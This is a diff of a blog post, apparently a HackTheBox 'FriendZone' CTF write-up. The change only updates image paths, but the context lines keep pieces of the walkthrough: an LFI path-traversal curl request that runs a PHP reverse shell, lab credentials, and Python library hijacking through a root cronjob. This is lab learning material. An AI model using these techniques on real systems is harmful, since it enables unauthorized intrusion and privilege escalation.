@@ -4,9 +4,9 @@ author: yufong
 categories: [HackTheBox, HackTheBox - Linux]
 date: 2022-09-11
 tags: [exploit/file-inclusion/lfi, linux-priv-esc/python-hijacking]
-img_path: /Writeups/HackTheBox/Linux/FriendZone/images/
+img_path: /_posts/Writeups/HackTheBox/Linux/FriendZone/images/
 image:
-  src: Pasted%20image%2020220911005207.png
+  path: /_posts/Writeups/HackTheBox/Linux/FriendZone/images/Pasted%20image%2020220911005207.png
   width: 1000   # in pixels
   height: 400   # in pixels
 ---
@@ -137,7 +137,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	<!-- Don't go deep ;) -->
 	```
 2. Proceed to `/js/js`
-	![](Pasted%20image%2020220911173351.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911173351.png)
 	- Random `base64` encoded characters is displayed
 3. Tried to enumerate some `GET` parameters, nothing interesting is found
 4. Based on that, I think it is a rabbit-hole.
@@ -183,12 +183,12 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		- `timestamp.php`
 			- Displays timestamp, used in `dashboard.php`
 2. Proceed to `administrator1.friendzone.red` & login w/ `admin:WORKWORKHhallelujah@#`
-	![](Pasted%20image%2020220911161807.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911161807.png)
 3. Proceed to `/dashboard.php`
 	```
 	image_id=a.jpg&pagename=timestamp
 	```
-	![](Pasted%20image%2020220911172320.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911172320.png)
 	- `timestamp` - earlier we enumerated it, the webpage is including `timestamp.php`
 4. Enumerating `GET` parameters
 	- `image_id`
@@ -307,7 +307,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	└─# curl -ks -H "Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1; sid=62febea0-31b0-11ed-a80f-e52e5d473100" 'https://administrator1.friendzone.red/dashboard.php?image_id=test&pagename=../../../../../etc/Development/php-reverse-shell'
 	```
 3. `www-data` shell obtained
-	![](Pasted%20image%2020220911183309.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911183309.png)
 4. User Flag
 	```
 	www-data@FriendZone:/var/www$ cd /home
@@ -371,12 +371,12 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	┌──(root💀kali)-[~/htb/friendzone/10.10.10.123/loot]
 	└─# sshpass -p 'Agpyu12!0.213$' ssh friend@friendzone.htb
 	```
-	![](Pasted%20image%2020220911184320.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911184320.png)
 
 
 ## Root - Via Python Library Hijacking
 1. Found something interesting w/ `linpeas.sh`
-	![](Pasted%20image%2020220911203348.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911203348.png)
 	- `server_admin`
 2. View files in `server_admin` directory
 	```
@@ -388,7 +388,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 	```
 	- There should be a cronjob executing `reporter.py`
 3. Verify that there is a cronjob running w/ `pspy64`
-	![](Pasted%20image%2020220911222349.png)
+	![]({{ page.img_path }}Pasted%20image%2020220911222349.png)
 	- There is a cronjob executing `/opt/server_admin/reporter.py` as `root` every 2 minutes
 4. View contents of `/opt/server_admin/reporter.py`
 	```
@@ -420,7 +420,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		```
 		friend@FriendZone:/usr/lib/python2.7$ ls -la | grep os                                                                                                                      
 		```
-		![](Pasted%20image%2020220911230640.png)
+		![]({{ page.img_path }}Pasted%20image%2020220911230640.png)
 		- `os.py` - `RWX`
 	2. Make a copy of `os.py` called `os_bak.py`
 		```
@@ -442,7 +442,7 @@ If you wish to practice boxes that are similar to this, try TryHackMe Dogcat (LF
 		```
 		friend@FriendZone:/tmp$ /tmp/rootbash -p
 		```
-		![](Pasted%20image%2020220911231617.png)
+		![]({{ page.img_path }}Pasted%20image%2020220911231617.png)
 6. Root Flag
 	```
 	rootbash-4.4# cat root.txt 
